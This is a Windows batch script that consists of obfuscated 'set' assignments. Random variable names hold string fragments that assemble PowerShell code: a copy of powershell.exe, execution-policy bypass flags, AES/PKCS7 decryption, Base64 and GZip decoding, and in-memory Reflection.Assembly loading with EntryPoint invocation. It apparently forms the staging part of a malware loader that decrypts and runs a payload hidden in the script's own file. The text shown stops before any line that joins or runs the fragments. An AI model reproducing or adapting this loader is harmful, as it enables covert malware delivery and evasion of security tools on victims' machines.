@echo off
set "oUIKMCUtys=em"
set "oVnEwvYshg=we"
set "sTaJaOgPkQ=rS"
set "DGtnVVBjvS=1."
set "RwINJalBDH=0\"
set "fCFZdboKKx=y "
set "vxOpInpldx=Sy"
set "iErTpgUlWz= /"
set "cRXuRsEbEd=.e"
set "tzuxhdZQKP=32"
set "ayHgFlbqeo=Wi"
set "vzYQkESRGt=xe"
set "EypCheNIjn=\v"
set "qoTacpGkfD=nd"
set "CNtzBJWgPI=s\"
set "tpimwnsndY=st"
set "xrHzfspYQl=ll"
set "oCCnGDQwJz=ws"
set "XOrjbKwDdG=Po"
set "qIdRtBPdDg=in"
set "QhnvtcbjxC=py"
set "rLdlamEgco=\W"
set "tVMLeTULft=do"
set "KsudiEECJu=he"
set "ANftdHWhIt=ow"
set "TKmrbUdnXT=ll"
set "hDnvTxNSDZ= C"
set "STGZaoFIsF=co"
set "QWtvQQYtDj=we"
set "QgCYuiPCTg=rs"
set "CjlgMZAoPX=:\"
set "TmeBPwHucJ=he"
set "yhZZllcRWd=po"
set "pFHfXRJhGf= %~dp0"
set "eybiJgyhqZ=cd"
set "AIOvIgHUsm=);$p"
set "xfaAktTFzM=m.Su"
set "hKECtihhWe=ach "
set "bahAlIWBJw=oL'["
set "aaLdJyqKXl=]::("
set "JrJOtRPnIE=.GZi"
set "ntMYXthWqI=..-1"
set "RnMStXcjeT=3HWs"
set "OEIwiqFJle= [st"
set "QFYSfuSBRt=jpZJ"
set "nLNGKRZMtm=oint"
set "sMVijOZqOZ=rity"
set "mirMAUJAxb=Disp"
set "CfRswBxwfh=raph"
set "YyHEqwzzcD=tem."
set "yPQysUWPvq=yste"
set "IdeWtvSfEk=m(, "
set "zQRavhYGMu=e = "
set "FwwwcHZFYd=grap"
set "sPGIDLUhSK=tryP"
set "poEzCDxGXQ=Mw.D"
set "ZbdbGrIsdq=rity"
set "FXlwzzeJaI=m.IO"
set "MPaQXayvXZ=pUq "
set "eeBzeyyszY=DaSn"
set "qQPrVuOGwt=0O+g"
set "AjmisCYggN=;$Mz"
set "ueEcvfgPZx=q.En"
set "jQhmWOGNtK=Dbm "
set "LBDJJAnHnO=)($j"
set "jqqOGTCRmz=-Obj"
set "yIrMBetfNK=F = "
set "HKnbuXUTVn=7Yiv"
set "KhwOomCDQl=pStr"
set "NyOWkSZknG=)($O"
set "ezUvJBdssK=  $O"
set "MjjvReJsnd=ew-O"
set "podOUfESRX=esMa"
set "edATKvgxwO=y.Ci"
set "SALOgoKNEB=();$"
set "CidfSpewvy=am;$"
set "jugghsNUoY=);$T"
set "ABcAbNYrgE=toLx"
set "iVDBDkTbgH=eam("
set "PaINAUdRwR=$Tgn"
set "OogxmFYrSO=[Sys"
set "gOdTwccRIf=New-"
set "CuTvjnpcwF=pDaS"
set "BHXTamDHit=ispo"
set "hyXkTkCTRq=16] "
set "GDrDRONikj=[IO."
set "BoMqiRheZp=comm"
set "XFdvRuwJyS=.Cop"
set "rpefGFjhAZ=gnir"
set "TlKObNnTis=yTo("
set "uwtVXfGPpG=Qm.T"
set "JybpofCXow=1..-"
set "FuRUULfyNH=OyzA"
set "PDCtXZmOGn=[Sys"
set "GHZDQOkOtH=.Com"
set "WAwfRJXzFg=Comp"
set "ljYzblJdMx=New-"
set "RfJItcbGKv='')("
set "zizsRRmCOQ=Jj);"
set "qmTKbDhNRw=hZMw"
set "CijWXMENql=.Ass"
set "SIBHHhEJpQ=trea"
set "lzmvDFNxLY=flec"
set "cjtuSXgrvn=Conv"
set "yNfxpEciAb=;$ZA"
set "jszsOuDjQS=] -j"
set "zPwJPQQbCq=rans"
set "FVeOPqDsFE=M) {"
set "ueVQYYZEIS=stem"
set "VGuXpEejwR=stem"
set "iAMAmxBCqL=-4] "
set "XLDbhOtVCd=jpZJ"
set "hxOPdrVNqx=lBlo"
set "TpSwfVdRYb=n.Pa"
set "rPjBDtFzAK=wTym"
set "NSnejukYcv=oArr"
set "WGPdtXUicK=, (,"
set "fHCUUhEUjS=-joi"
set "AGicoHIsQB=$pDa"
set "cQocWltDuH=yste"
set "cMHmqBJQAj=tem."
set "tdxjVdbzNP=ss -"
set "dZbaGLlqGA=6esa"
set "tMuDYdxkaS=ionM"
set "aeukwFPfsC=-nop"
set "KyNYPXJXDW=and "
set "khevtSRvuv= = $"
set "uesMiWUnAf=::('"
set "NLDNQyXfGa=ne);"
set "rbcUMxXROS=.IO."
set "KEyEqLGLcK=m.IO"
set "iXhiOYRHlW=esaB"
set "SHIdFIaLUk=Qm);"
set "EUKrEesAXZ=em.C"
set "iWBaKOXqkd=m.Re"
set "rKujKXxEor=)) {"
set "ZAMfJcRbKw=DaSn"
set "kknfqAQCmk=bypa"
set "OswHIdgatH=in $"
set "jqlbRXfcYR=Secu"
set "NFeZopTqzU=rt]:"
set "OAjhSZQLcp=S46e"
set "NVkQxnVbNX=g = "
set "eYaGlLpuOH=brea"
set "LRXqSsVTaY=O.Me"
set "dTQpWmZYzf=morF"
set "tLxMUyHtjD=.Con"
set "QTBxrBxtkd=:: '"
set "xZsxZVPIdJ=tion"
set "NbQcRHrECs=n ''"
set "nAhaurEcFC=form"
set "WysQMWvGXY=raph"
set "gvoNRgVNmp=]::N"
set "KbLkFsomXK= = ["
set "fmqEylPUTB= [Sy"
set "PCvfGXWiVx=sGUc"
set "ChTbDnJkPA=Qm ="
set "PEVmWAQCNS=pDZz"
set "uzutHzFstN=[]] "
set "YCZUMqhaws=ing("
set "NzXHFgDGYs=DaSn"
set "fuwNKYjnoy=ke($"
set "jcADtbYWdo=yste"
set "grEozOaKwa=ct S"
set "zAMPaBzWKJ=pZJj"
set "VuXzLfAfhv=vert"
set "pSipbtHFIC=($rW"
set "jShDYloRDY=null"
set "lipxbzqpMt=d;$p"
set "eEYUhtOEKZ='gni"
set "CtNlpeBtQQ= if "
set "ndhLFxqMKJ=);$G"
set "ltNdJtKuSE=OqF."
set "sGYufyxbhZ=fore"
set "HtXarapgtg=orF'"
set "TtiwxaTOLF=$Tgn"
set "YyKByHeRnU=TllA"
set "cLTUWPanze=esFX"
set "aYAWvAXdZG=hy.A"
set "NtFsufCbao=;$rx"
set "hcMnQETIQE=Syst"
set "iwMLKmunxO== $p"
set "YFjthrTaHJ=j = "
set "BcJKlPbjGD=j = "
set "aHnSQfCfIo=$GhZ"
set "SXQOJYKlsT=VDJF"
set "rQKGGZBtIb=$jpZ"
set "JfOaZKfnVZ== [S"
set "keRbMnNTGR=bjec"
set "zMaeDeZrHM=File"
set "HKNsdIoVeS=ose("
set "BMbvsPquFA=:('g"
set "HbnCrBTHgd=736u"
set "xarEAKOVHy=stem"
set "wYbzUvSBXs=($rW"
set "XNBHGdxkjd=ode]"
set "gsxgnIZUlM=$Mzp"
set "LgKekKTkKd=).Sp"
set "wRMiKNNcwQ=, $j"
set "vPPcRUfgNU=k; }"
set "lgWBvhDdXb=mory"
set "jiVbzHArip= '')"
set "WSoeirJIkc='txe"
set "RkRwuhOQhi=pose"
set "jtjbBglCeq=.Cry"
set "ZHXWRqqZln=daeR"
set "OpyXUVcTAz=Secu"
set "WQaLFwKQvK=urit"
set "OMvXIlQfuJ=em.I"
set "aNmPXjOuLA=Jj ="
set "nmlvbKVjqL=bstr"
set "JAOkMIZdDK=pher"
set "MOcRNCDTyq=embl"
set "urhFOCqjEc=..-1"
set "rWkNlGqNMO=-1.."
set "NJNSFyQiDq=ptog"
set "XSUctAXCHp=);$p"
set "hoVSuDdKyG=Syst"
set "IfLhUHlfTf=vj0m"
set "ntEoVetoTT=tem."
set "fFYrSghEqV=$jpZ"
set "ZDxCvktezK=3); "
set "RYrUzbXNoO=ck($"
set "xRwFCzWeer=ptor"
set "FFFyxoBqWt=)))"
set "BUXpBOpGiq=Disp"
set "neFiXrSmoK='dqR"
set "kcbdxtYmbs=saBm"
set "McnFBoPgGT=ct S"
set "JZIStIPUCB=GhZM"
set "eOqfwpoFAb=.Cry"
set "zRnzfGbhmY=nage"
set "ZZsuqzELeC= New"
set "KCyKJCmowb=;$to"
set "xVSvjiEdbP=y]::"
set "nQHcIJhRrC= '')"
set "sDkJaFbpkU=.Dis"
set "KsFcfaCTDt=[-1."
set "wOxRQWitFC==');"
set "QuFOPkgSgO=comp"
set "jeyxyodbeW=Fo7l"
set "vmHLuGwztz=gMod"
set "IOwXlKjTij=]::C"
set "aTbIKVmgQh=Stre"
set "mctEybezoU=n ''"
set "ydABNWZZKj=qF, "
set "DmAVjWxWWz=mM ="
set "xhZFsOCzDv=ose("
set "yfUtsFeZRu=ddin"
set "GQfaTceILI=;$Mz"
set "OBWEWYfevy=6] -"
set "HNisJRQpFW=w = "
set "evNYwighPa=sion"
set "iWcUxHeBsb=le  "
set "kHAgftsozs=]::("
set "novGpxOrjA=-joi"
set "tMDWAVpzuY= [Sy"
set "wDwTnumymJ=oryS"
set "dgOaEiLbQO=.Mod"
set "NZKvLunpta=pose"
set "ZNpXFiFBKw=nirt"
set "LeLaVWMEDf=Lxq "
set "LfWVSwnaDQ=Fina"
set "XOgbWHidQD=Comp"
set "CQxLjPLrXd=j, 0"
set "bsvIGnrjgy=pres"
set "pPHnDcVOnJ=pUq."
set "uhxCqcAqIL=[Sys"
set "DUpaNevbNG=ress"
set "ssMOGcqGGO=BC;$"
set "aKavWXLxIp=join"
set "SmJJuNNONw=tsWi"
set "YRNxxeCQEa=Mode"
set "TYqzDHTGJb=DaSn"
set "yRlhUIXSCW=ypto"
set "JzCXdDcTmC=ddin"
set "yNodueJRZL=UGTu"
set "THIBmHZnLt=e]::"
set "ipytZhbmPY=t Sy"
set "kUqWbeKvBj=ion."
set "xNbGKREFVr=Obje"
set "DPiTxEwzcX=.Key"
set "SYDlCfgick=);$r"
set "JCzRHafEoJ=V = "
set "hulYjdBDxO=pZJj"
set "OvZkOeWvKs=ptog"
set "QCohHqzfbe=$wTy"
set "hnUDVGyWVl='[-1"
set "YjDNTlCuCE=lit("
set "XhThXDionE=();$"
set "xscLJonxLx=isfL"
set "tWzvEFejYo=+hAO"
set "kWvfztHkbN=ZAOq"
set "tywcmpVsmR=1] -"
set "LTTVGqsHCX=DaSn"
set "SJqfaXdQBn=ay()"
set "agviTIQRrG=('%~f0'"
set "hVwHSoMkqp=::De"
set "CeOJgvIDuR=Uq.T"
set "DwKqGBJUmk=rtS4"
set "KcjTkLZhHu=jpZJ"
set "ebkDKFkLvI=('%*'"
set "ovakEeuiLU=.Dis"
set "eQQhIwWuNi=PKCS"
set "uGEBjDtrba=v4Ir"
set "XBPPsqZgOP=rWDb"
set "CLxbQDQQWB=gnQm"
set "pFQlsZTPir=gth)"
set "YpmABcppxR=('da"
set "rVfGrHTYZl=Sn.I"
set "SVtsLZIAAB=tS46"
set "IHeztsoyOD=ect "
set "UBtvDBzLrS=7;$p"
set "chIysbljpc=Obje"
set "htGCGJJHDO= = N"
